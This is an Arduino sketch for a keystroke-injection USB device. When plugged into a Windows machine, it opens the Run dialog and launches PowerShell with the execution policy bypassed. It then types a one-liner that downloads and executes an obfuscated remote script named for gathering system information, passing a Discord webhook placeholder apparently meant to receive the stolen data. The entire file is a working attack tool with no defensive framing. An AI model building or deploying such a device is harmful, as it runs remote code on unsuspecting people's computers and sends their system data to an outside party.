#include <Keyboard.h>

const char* payload = "iex \"& {$(irm https://raw.githubusercontent.com/calinux-py/Arduino/refs/heads/main/systeminfo/obfu_systeminfo.ps1)} 'https://discordapp.com/api/webhooks/YOU_WEBHOOK'\"";

void setup() {
  Keyboard.begin();
  delay(3500); 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(250);
  Keyboard.print("powershell -NoP -ExecutionPolicy Bypass");
  delay(1250);
  Keyboard.press(KEY_RETURN);
  delay(250);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.print(payload);
  delay(250);
  Keyboard.print("; exit");
  delay(750);
  Keyboard.press(KEY_RETURN);
  delay(250);
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop() {}

